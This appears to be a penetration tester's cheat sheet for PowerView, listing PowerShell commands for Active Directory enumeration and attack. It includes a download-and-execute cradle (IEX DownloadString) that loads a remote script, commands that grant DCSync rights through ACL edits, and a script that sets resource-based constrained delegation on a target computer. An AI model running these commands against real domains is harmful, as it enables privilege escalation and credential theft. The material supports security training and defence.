# [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

> Offensive PowerShell module for enumeration and exploitation of an Active Directory environment.

---

## Import PowerView

To use `PowerView`, you must first import it into the current PowerShell session.

To do this in a normal PowerShell prompt on the host:

```powershell
Import-Module -Name $PATH_TO_POWERVIEW.ps1
```

To import a remotely hosted PowerView:

```powershell
IEX (New-Object Net.Webclient).DownloadString($HTTP_URL_TO_POWERVIEW_SCRIPT); $POWERVIEW_COMMAND_HERE
```

Note `$POWERVIEW_COMMAND_HERE`. Remote imports only last for that line. Thus, all PowerView commands will need to be on the same line (separated by semicolons).

---

## Get-NetDomain

Gathers information about the domain, including forest name, domain controllers, and domain name. A more concise version of the ActiveDirectory module's *Get-ADDomain*.

```powershell
Get-NetDomain
```

---

## Get-NetDomainController

Lists all the domain controllers in the network.

```powershell
Get-NetDomainController
```

On Linux: [[pywerview#get-netdomaincontroller|pywerview's get-netdomaincontroller]].

---

## Get-NetForest

Gathers information on the forest, including all associated domains, the root domain, and the domain controllers for the root domain. Similar to the ActiveDirectory module's *Get-ADForest*.

```powershell
Get-NetForest
```

---

## Get-NetDomainTrust

Gathers information on the trusts in the domain, including direction, source, and target. A more concise version of the ActiveDirectory module's *Get-ADTrust*.

```powershell
Get-NetDomainTrust
```

---

## Get-DomainUser

Gathers information on the users in the domain. A more concise version of the ActiveDirectory module's *Get-ADUser*.

```powershell
Get-DomainUser | select cn
```

---

## Get-DomainComputer

Gathers information on the computers in the domain.

```powershell
Get-DomainComputer | select name, operatingsystem
```

On Linux: [[pywerview#get-netcomputer|pywerview's get-netcomputer]].

---

## Get-NetShare

Gathers information on the shares in the domain.

```powershell
Get-NetShare
```

---

## List group policy objects (GPOs)

```powershell
Get-NetGPO | select displayname, whenchanged
```

---

## List shares across the domain

```powershell
Invoke-ShareFinder
```

---

## Get Domain SID

```powershell
Get-DomainSID
```

---

## Gather Users who don't Require [[kerberos#Kerberos Pre-Authentication|Kerberos Pre-Authentication]]

```powershell
Get-DomainUser -KerberosPreauthNotRequired
```

---

## Gather Computers & Users Configured with [[unconstrained-delegation|Unconstrained Delegation]]

Must be executed in the context of a domain user account.

```powershell
Get-DomainComputer -Unconstrained
Get-NetComputer -Unconstrained
```

```powershell
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

---

## Gather Computers & Users Configured with [[constrained-delegation|Constrained Delegation]]

Must be executed in the context of a domain user account.

```powershell
Get-DomainComputer -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName,dnsHostName]
Get-NetComputer -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName,dnsHostName]
```

```powershell
Get-DomainUser -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName]
Get-NetUser -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName]
```

---

## Return Users that **are not** Marked as "Sensitive and Not Allowed for Delegation"

Must be executed in the context of a domain user account.

```powershell
Get-DomainUser -AllowDelegation
Get-NetUser -AllowDelegation
```

---

## Return Users that **are** Marked as "Sensitive and Not Allowed for Delegation"

Must be executed in the context of a domain user account.

```powershell
Get-DomainUser -DisallowDelegation
Get-NetUser -DisallowDelegation
```

---

## Retrieve an Object's DACL

### Retrieve a User's DACL

```powershell
Get-DomainObjectAcl [-SamAccountName $SAM_ACCOUNT_NAME] -ResolveGUIDs [| ? {$_.ActiveDirectoryRights -eq "$PERMISSION"}]
```

- `$SAM_ACCOUNT_NAME` of the user account
- `$PERMISSION` is the permission to filter for
	- [[dacls-aces#Permissions of Interest|Here's some permissions of interest]]

### Retrieve a Group's DACL

You'll need the distinguished name of the group.

```powershell
Get-DomainGroup $GROUP_NAME | select DistinguishedName
```

Example distinguished name: `CN=Domain Admins,OU=Groups,DC=MARVEL,DC=test`.

Retrieve the group's DACL with the distinguished name.

```powershell
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "$DISTINGUISHED_NAME"[ -and $_.ActiveDirectoryRights -eq "$PERMISSION"]}
```

- `$PERMISSION` is the permission to filter for
	- [[dacls-aces#Permissions of Interest|Here's some permissions of interest]]

### Retrieve a Computer's DACL

Same procedure as [[powerview#Retrieve a User's DACL|retrieving a user's DACL]] except you use the `$SAM_ACCOUNT_NAME` of the computer.

### Convert SID To Object Name

This may come in handy, as many object's ACEs designate the subject by its SID.

```powershell
"$SID" | Convert-SidToName
```

---

## Determine All Principals Who Can Execute a [[dcsync|DCSync]]

```powershell
Get-ObjectAcl -DistinguishedName "$DISTINGUISHED_NAME_OF_THE_DOMAIN" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

You'll probably need to [[powerview#Convert SID To Object Name|translate each of the resultant objects' SIDs into their actual names]].

---

## Add an ACE to a Principal's DACL

```powershell
Add-DomainObjectAcl -PrincipalIdentity "$PRINCIPAL" -TargetIdentity "$TARGET" -Rights $RIGHTS [-Credentials $CREDENTIALS] [-Verbose]
```

- `$PRINCIPAL` is the domain principal **subject** of the ACE
- `$TARGET` is the domain principal **object** of the ACE
- `$RIGHTS` are either `ResetPassword`, `WriteMembers`, `DCSync`, or `All`.
- `$CREDENTIALS` is an optional [[powershell#Create a Credential|PSCredential]] object of a domain principal authorized to add the ACE to the target principal's DACL

---

## Assign DCSync Privileges to a Principal

```powershell
Add-DomainObjectAcl -PrincipalIdentity $PRINCIPAL -TargetIdentity $DISTINGUISHED_NAME_OF_DOMAIN -Rights DCSync [-Credentials $CREDENTIALS] [-Verbose]
```

- `$PRINCIPAL` is the principal who you are adding DCSync privileges to
- `$CREDENTIALS` is a [[powershell#Create a Credential|PSCredential]] object of a domain principal authorized to add the ACE to the domain's ACL
	- Out of precaution, it's often wise to include this parameter, even if you're executing in the context of the same user whose credential you would pass in (remember HTB Forest)

---

## Configure [[resource-based-constrained-delegation|Resource-Based Constrained Delegation]] from `ComputerA` to `ComputerB`

`ComputerB` is specifying that `ComputerA` is allowed to delegate to it.

Requires `GenericAll`, `GenericWrite`, or `WriteDACL` permission to `ComputerB`.

```powershell
# Get ComputerA's SID
$ComputerASid = Get-DomainComputer ComputerA -Properties objectsid | Select -Expand objectsid

# Build the raw security descriptor with ComputerA as the principal
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerASid))"

# Get the raw bytes for the security descriptor
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set the new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer ComputerB | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# (Optional) Confirm security descriptor addition
$RawBytes = Get-DomainComputer ComputerB -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
```

---

## Cleanup After [[resource-based-constrained-delegation|Resource-Based Constrained Delegation Attack]]

Clear the `msds-allowedtoactonbehalfofotheridentity` attribute from the target computer.

```powershell
Get-DomainComputer $TARGET | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
```